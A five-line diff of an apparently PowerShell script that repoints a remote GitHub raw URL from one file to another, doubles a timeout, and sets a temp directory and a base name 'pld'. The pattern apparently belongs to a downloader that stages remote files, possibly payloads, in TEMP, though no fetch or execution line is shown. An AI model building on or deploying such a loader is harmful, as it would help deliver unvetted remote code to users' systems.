@@ -1,5 +1,5 @@
-$urls = @("https://raw.githubusercontent.com/hellow2003/phpcode/main/dirfinal2.txt")
-$timeout = 300
+$urls = @("https://raw.githubusercontent.com/hellow2003/phpcode/main/dirfinal3.txt")
+$timeout = 600
 $tempDir = $env:TEMP
 $base = "pld"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
